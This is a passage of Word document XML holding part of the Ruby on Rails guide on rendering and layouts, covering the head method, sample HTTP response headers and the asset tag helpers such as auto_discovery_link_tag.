          <w:p w14:paraId="0EF8B2B3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75EC3752" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="345C8349" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This would detect that there are no books with the specified ID, populate the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@books</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instance variable with all the books in the model, and then directly render the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> template, returning it to the browser with a flash alert message to tell the user what happened.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C255871" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.4 Using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>head</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> To Build Header-Only Responses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FBEDE7D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>head</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method can be used to send responses with only headers to the browser. It provides a more obvious alternative to calling </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render :nothing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>head</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method takes one parameter, which is interpreted as a hash of header names and values. For example, you can return only an error header:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1BC3B6B4" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="786A296A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="44107021"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>head :bad_request</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3E44E025" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This would produce the following header:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7D1ED5C8" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7357D397" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>HTTP/1.1 400 Bad Request</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B5D3421" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Connection: close</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11A59B9A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date: Sun, 24 Jan 2010 12:15:53 GMT</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="194F0C9C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Transfer-Encoding: chunked</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08A36FDA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Content-Type: text/html; charset=utf-8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0106B3FF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X-Runtime: 0.013483</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79340125" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Set-Cookie: _blog_session=...snip...; path=/; HttpOnly</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B1CDB88" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Cache-Control: no-cache</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="22FC50A5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Or you can use other </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> headers to convey other information:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5448"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="779DA60E" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44AE8E80" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="535890380"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>head :created, :location</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; photo_path(@photo)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="75F853F4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Which would produce:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7DF9E4E0" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="52B9B4FF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>HTTP/1.1 201 Created</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39617021" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Connection: close</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A17857E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date: Sun, 24 Jan 2010 12:16:44 GMT</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23691502" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Transfer-Encoding: chunked</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1157A63A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Location: /photos/1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A90B0E5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Content-Type: text/html; charset=utf-8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BDF3960" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X-Runtime: 0.083496</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DA8FF33" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Set-Cookie: _blog_session=...snip...; path=/; HttpOnly</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="675333DF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Cache-Control: no-cache</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="76CE50AB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>3 Structuring Layouts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F9B484" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>When Rails renders a view as a response, it does so by combining the view with the current layout, using the rules for finding the current layout that were covered earlier in this guide. Within a layout, you have access to three tools for combining different bits of output to form the overall response:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8F2AA7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Asset tags</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78644EC9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>yield</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>content_for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2F7A9E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Partials</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277FD425" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Asset Tag Helpers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFA53A0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Asset tag helpers provide methods for generating </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that link views to feeds, JavaScript, stylesheets, images, videos and audios. There are six asset tag helpers available in Rails:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37670634" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="71"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>auto_discovery_link_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0665D415" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="71"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>javascript_include_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B85DF48" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="71"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stylesheet_link_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D382BB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="71"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>image_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324B14E7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="71"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>video_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056DBB03" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="71"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>audio_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DAC1471" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can use these tags in layouts or other views, although the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>auto_discovery_link_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>javascript_include_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stylesheet_link_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, are most commonly used in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;head&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> section of a layout.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D990F4A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The asset tag helpers do </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> verify the existence of the assets at the specified locations; they simply assume that you know what you’re doing and generate the link.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63EC545C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.1.1 Linking to Feeds with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>auto_discovery_link_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6D3C63" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>auto_discovery_link_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper builds </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that most browsers and newsreaders can use to detect the presence of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>RSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or Atom feeds. It takes the type of the link (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:rss</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:atom</w:t>
      </w:r>
      <w:r>
        <w:t>), a hash of options that are passed through to url_for, and a hash of options for the tag:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6335"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2D44B117" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="05B2A28C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>auto_discovery_link_tag(:rss, {:action</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "feed"},</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31127CA6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  {:title</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "RSS Feed"}) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F4A8F74" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There are three tag options available for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>auto_discovery_link_tag</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A6E35A6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="72"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:rel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> specifies the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
